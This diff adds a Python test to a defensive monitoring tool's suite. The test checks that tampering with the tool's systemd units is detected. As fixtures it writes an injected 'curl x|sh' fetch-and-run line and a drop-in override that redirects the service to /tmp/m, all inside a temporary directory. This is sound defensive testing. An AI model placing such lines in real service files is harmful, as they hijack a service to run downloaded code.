@@ -85,5 +85,28 @@ def test_install_monitor_watch_units():
     assert 'PathChanged=%h/Documents' in (d / 'arche-defender-watch-ransomware-tripwire.path').read_text()
 
 
+def test_tamper():
+    import atexit, shutil, tempfile
+    from pathlib import Path
+    from arche import monitor, core
+    core.load_all()
+    d = Path(tempfile.mkdtemp()); atexit.register(shutil.rmtree, d, True)
+    state = {'timer': 'enabled'}
+    real = monitor.UNITS, monitor.sh, monitor.SEEN
+    monitor.UNITS, monitor.SEEN = d, d / 'n.json'   # systemctl is stubbed: nothing is installed on this PC
+    monitor.sh = lambda *a, **k: state['timer'] if 'is-enabled' in a else 'active' if 'is-active' in a else ''
+    try:
+        monitor.install()
+        assert list(monitor.tamper()) == [], list(monitor.tamper())
+        svc = d / 'arche-defender-watch-dropped-files.service'
+        svc.write_text(svc.read_text().replace('ExecStartPre=/bin/sleep 3', 'ExecStartPre=/bin/sh -c "curl x|sh"'))
+        (d / 'arche-defender.service.d').mkdir(); (d / 'arche-defender.service.d/x.conf').write_text('[Service]\nExecStart=\nExecStart=/tmp/m\n')
+        (d / 'arche-defender-watch-mcp-servers.path').unlink(); state['timer'] = 'disabled'
+        rows = [(s, t) for t, s, _ in monitor.tamper()]
+    finally: monitor.UNITS, monitor.sh, monitor.SEEN = real
+    assert [s for s, _ in rows] == [2, 2, 1, 0], rows
+    assert 'curl x|sh' in rows[0][1] and 'arche-defender.service: [Service] ExecStart= ExecStart=/tmp/m' in rows[1][1] and 'MCP servers' in rows[3][1], rows
+
+
 if __name__ == '__main__':
-    test_install_monitor_watch_units(); test_fresh(); test_watch_run_keeps_other_notices(); test_hourly_run_refreshes_intel(); test_weekly_run_refreshes_deps_once_opted_in(); test_install_desktop_adds_scan_menu(); print('ok')
+    test_tamper(); test_install_monitor_watch_units(); test_fresh(); test_watch_run_keeps_other_notices(); test_hourly_run_refreshes_intel(); test_weekly_run_refreshes_deps_once_opted_in(); test_install_desktop_adds_scan_menu(); print('ok')
